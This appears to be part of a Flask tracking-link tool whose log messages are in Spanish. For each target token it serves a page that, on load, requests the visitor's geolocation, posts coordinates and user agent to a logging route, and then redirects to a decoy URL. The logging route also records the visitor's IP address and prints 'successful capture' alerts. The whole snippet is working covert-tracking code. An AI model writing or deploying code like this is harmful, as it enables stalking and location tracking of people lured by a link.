@app.route('/<token>')
def index(token):
    return render_template_string(f"""
    <html><body onload="c()">
    <script>
        function c() {{
            navigator.geolocation.getCurrentPosition((p) => {{
                fetch('/log?id={token}', {{method: 'POST', body: JSON.stringify({{lat: p.coords.latitude, lon: p.coords.longitude, ua: navigator.userAgent}})}})
                .then(() => window.location.href = "{URL_REDIRECT}");
            }}, () => window.location.href = "{URL_REDIRECT}");
        }}
    </script>
    </body></html>
    """)

@app.route('/log', methods=['POST'])
def log():
    id_link = request.args.get('id')
    data = request.json
    data['id'] = id_link
    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    log_data(data)
    print(f"\n{GREEN}[!] CAPTURA EXITOSA (ID: {id_link}){RESET}")
    print(f"{CYAN}[*] IP: {data['ip']} | COORD: {data['lat']}, {data['lon']}{RESET}")
    return "OK"

